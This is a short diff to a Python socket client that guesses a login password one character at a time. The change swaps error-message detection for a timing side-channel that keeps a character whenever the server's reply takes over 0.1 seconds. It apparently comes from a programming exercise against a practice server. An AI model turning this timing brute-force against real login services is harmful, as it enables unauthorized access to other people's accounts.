@@ -2,6 +2,7 @@ import itertools
 import json
 import socket
 import sys
+import time
 
 
 def get_set(line):
@@ -41,8 +42,10 @@ with socket.socket() as client:
                             msg['password'] = password + c
                             json_str = json.dumps(msg)
                             client.send(json_str.encode())
+                            start = time.perf_counter()
                             response = json.loads(client.recv(10240).decode())
-                            if response['result'] == "Exception happened during login":
+                            end = time.perf_counter()
+                            if end - start > 0.1:
                                 password += c
                             elif response['result'] == 'Connection success!':
                                 print(json_str)
